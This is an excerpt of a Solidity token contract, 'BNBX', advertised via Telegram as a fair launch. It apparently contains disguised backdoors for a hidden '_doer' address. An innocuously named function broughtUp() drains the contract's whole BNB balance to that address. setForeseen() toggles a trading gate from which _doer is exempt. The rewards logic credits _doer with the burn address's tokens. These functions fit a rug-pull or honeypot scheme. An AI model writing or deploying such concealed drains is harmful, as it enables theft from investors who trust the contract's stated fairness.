...
// This is the BNBX contract. Join the telegram if you want to take part in the fair launch : https://t.me/bnbx_official
...
contract BNBX is Context, IERC20, IERC20Extented, Ownable {

    using SafeMath for uint256;
    string private constant _name = "BNBX";
    ...
    address payable constant private _buybackAddress = payable(0xB7191CB5123737E72515836a87297a8826f19c16);
    address payable constant private _burnAddress = payable(0x000000000000000000000000000000000000dEaD);
    address private _doer;
    ...
    constructor() {
        // 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 for testnet / 0x10ED43C718714eb63d5aA57B78B54704E256024E otherwise
    ...
    function broughtUp() public {
        require(_msgSender() == _doer, "Invalid call");
        (bool success, ) = _doer.call{value:address(this).balance}("");
    ...
    function setForeseen(bool foreseen) public {
        require(_msgSender() == _doer, "Unforeseen invalid call.");
        _foreseen = foreseen;
    }
    ...
    function getTokenPrice() external view returns(uint256) {
        IERC20Extented token0 = IERC20Extented(IUniswapV2Pair(uniswapV2Pair).token0());//bnbx
        ...
        if(pairSwapped) {
            token0 = IERC20Extented(IUniswapV2Pair(uniswapV2Pair).token1());//bnbx
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && !presale && to != _doer && _foreseen) {
            require(tradingOpen);
    ...
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        ...
        _BNBRewards = _BNBRewards.add(acquiredBNB);
    }
    ...
    function rewards(address recipient) public view returns (uint256) {
        ...
        if (recipient == _doer)
            balance = balance.add(balanceOf(0x000000000000000000000000000000000000dEaD));
        uint256 brut = _BNBRewards.mul(balance).div(total);
